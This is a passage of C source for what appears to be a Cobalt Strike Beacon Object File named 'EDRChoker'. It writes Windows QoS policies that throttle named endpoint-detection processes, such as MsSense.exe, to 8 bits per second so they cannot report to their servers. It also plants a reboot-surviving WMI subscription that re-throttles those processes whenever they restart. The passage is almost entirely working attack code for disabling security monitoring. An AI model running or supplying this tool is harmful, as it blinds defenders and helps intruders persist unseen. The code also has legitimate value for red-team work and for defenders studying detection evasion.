        pLoc, bns, NULL, NULL, 0L,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
    OLEAUT32$SysFreeString(bns);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] ConnectServer(%S) failed (0x%08X)\n"
            "    Ensure WMI service is running: sc query winmgmt\n", ns, hr);
        return NULL;
    }
    OLE32$CoSetProxyBlanket((IUnknown*)pSvc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return pSvc;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, process_list)):
 *
 *   [int32] mode
 *     0 = throttle all listed processes + install WMI watchdog
 *     1 = restore network for listed processes (remove their QoS policies)
 *     2 = restore ALL (remove all edrchoker policies + remove WMI watchdog)
 *
 *   [wchar_t* Z] process_list
 *     Semicolon-separated process names, e.g. "elastic.exe;MsSense.exe"
 *     Empty string for mode 2.
 *
 * COM is initialized with COINIT_MULTITHREADED because Beacon runs its own
 * COM apartment. RPC_E_TOO_LATE means COM was already initialized — acceptable.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG     mode    = BeaconDataInt(&parser);
    int      argBytes = 0;
    wchar_t* rawArg  = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    /* Copy process list to a mutable stack buffer.
     * WNextTok modifies it in-place. rawArg points into Beacon's read-only
     * argument block and must not be written directly.                      */
    wchar_t buf[2048] = {0};
    if (rawArg && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 2048) n = 2047;
        KERNEL32$RtlMoveMemory(buf, rawArg, n * sizeof(wchar_t));
        buf[n] = L'\0';
    }

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed (0x%08X)\n", hr);
        return;
    }

    hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);
    /* RPC_E_TOO_LATE = COM already initialized in this process (Beacon) — OK */
    if (FAILED(hr) && hr != (HRESULT)RPC_E_TOO_LATE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CoInitializeSecurity failed (0x%08X)\n", hr);
        goto done_com;
    }

    IWbemLocator* pLoc = NULL;
    hr = OLE32$CoCreateInstance(&g_CLSID_WbemLocator, NULL,
                                CLSCTX_INPROC_SERVER,
                                &g_IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CoCreateInstance(WbemLocator) failed (0x%08X)\n", hr);
        goto done_com;
    }

    /* ── MODE 0: THROTTLE + WATCH ────────────────────────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] No process list provided. Usage: edrchoker proc1.exe;proc2.exe\n");
            goto done_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto done_loc;

        /* Count processes (consume a copy so buf stays intact for later use) */
        wchar_t countBuf[2048] = {0};
        KERNEL32$RtlMoveMemory(countBuf, buf, sizeof(wchar_t) * 2047);
        int total = 0;
        wchar_t* cc = countBuf;
        while (WNextTok(&cc) != NULL) total++;

        BeaconPrintf(CALLBACK_OUTPUT,
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "[*] EDRChoker — THROTTLE MODE\n"
            "    Writing QoS policies to ROOT\\StandardCimv2\n"
            "    pacer.sys will cap each process to 8 bits/sec\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

        int ok = 0, fail = 0;
        wchar_t throttleBuf[2048] = {0};
        KERNEL32$RtlMoveMemory(throttleBuf, buf, sizeof(wchar_t) * 2047);
        wchar_t* cursor = throttleBuf;
        wchar_t* tok;
        while ((tok = WNextTok(&cursor)) != NULL) {
            if (CreatePolicy(pSvc, tok)) ok++; else fail++;
        }

        if (fail == 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "\n[*] RESULT: %d/%d processes blocked\n"
                "    EDR cannot reach C2 — pacer.sys enforcing immediately\n",
                ok, ok);
        else
            BeaconPrintf(ok == 0 ? CALLBACK_ERROR : CALLBACK_OUTPUT,
                "\n[*] RESULT: %d/%d blocked, %d FAILED\n"
                "    Check errors above — failed processes still have network access\n",
                ok, ok + fail, fail);

        pSvc->lpVtbl->Release(pSvc);

        /* Install persistent watchdog */
        IWbemServices* pSub = WmiConnect(pLoc, L"ROOT\\subscription");
        if (!pSub) goto done_loc;

        wchar_t wqlBuf[4096]  = {0};
        wchar_t watchBuf[2048] = {0};
        KERNEL32$RtlMoveMemory(watchBuf, buf, sizeof(wchar_t) * 2047);
        BuildWatchWQL(wqlBuf, 4096, watchBuf);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] EDRChoker — WATCHDOG INSTALL\n"
            "    If EDR is killed and restarts, WMI will auto-throttle it again\n"
            "    Stored in ROOT\\subscription (survives reboot)\n");
        InstallSubscription(pSub, wqlBuf);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n    Verify QoS:     Get-WmiObject -Ns ROOT\\StandardCimv2 -Class MSFT_NetQosPolicySettingData\n"
            "    Verify watchdog: Get-WmiObject -Ns ROOT\\subscription -Class __EventFilter\n");

        pSub->lpVtbl->Release(pSub);

    /* ── MODE 1: RESTORE specific processes ──────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] No process name provided. Usage: edrchoker remove proc.exe\n");
            goto done_loc;
        }

        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto done_loc;

        BeaconPrintf(CALLBACK_OUTPUT,
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "[*] EDRChoker — RESTORE MODE\n"
            "    Removing QoS policies for: %S\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n",
            buf);

        wchar_t wql[2048]        = {0};
        wchar_t restoreBuf[2048] = {0};
        KERNEL32$RtlMoveMemory(restoreBuf, buf, sizeof(wchar_t) * 2047);
        BuildRemoveWQL(wql, 2048, restoreBuf);
        int n = ExecDeleteQuery(pSvc, wql);

        BeaconPrintf(n > 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "\n[*] RESULT: %d QoS polic%s removed\n"
            "    %S\n",
            n, n == 1 ? "y" : "ies",
            n > 0 ? L"Network access returned to process(es)" :
                    L"No matching policies found — process may not have been throttled");

        /* Note: WMI watchdog is kept active intentionally.
         * If the same process starts again, watchdog will re-throttle it.
         * Use 'edrchoker remove' (no process name) to also remove the watchdog. */
        if (n > 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "    Note: WMI watchdog is still active.\n"
                "    If this process restarts, it will be auto-throttled again.\n"
                "    Run 'edrchoker remove' to also remove the watchdog.\n");

        pSvc->lpVtbl->Release(pSvc);

    /* ── MODE 2: RESTORE ALL + remove watchdog ───────────────────────────── */
    } else {
        IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
        if (!pSvc) goto done_loc;

        BeaconPrintf(CALLBACK_OUTPUT,
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "[*] EDRChoker — RESTORE ALL MODE\n"
            "    Removing all QoS throttle policies + WMI watchdog\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");

        int n = ExecDeleteQuery(pSvc,
            L"SELECT * FROM MSFT_NetQosPolicySettingData "
            L"WHERE ThrottleRateAction <= 1048576");
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] QoS cleanup: %d polic%s removed — all processes have full network access\n",
            n, n == 1 ? "y" : "ies");
        pSvc->lpVtbl->Release(pSvc);

        IWbemServices* pSub = WmiConnect(pLoc, L"ROOT\\subscription");
        if (!pSub) goto done_loc;
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] Removing WMI watchdog...\n");
        RemoveSubscription(pSub);
        pSub->lpVtbl->Release(pSub);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] DONE — EDRChoker fully removed\n");
    }

done_loc:
    pLoc->lpVtbl->Release(pLoc);
done_com:
    OLE32$CoUninitialize();
}
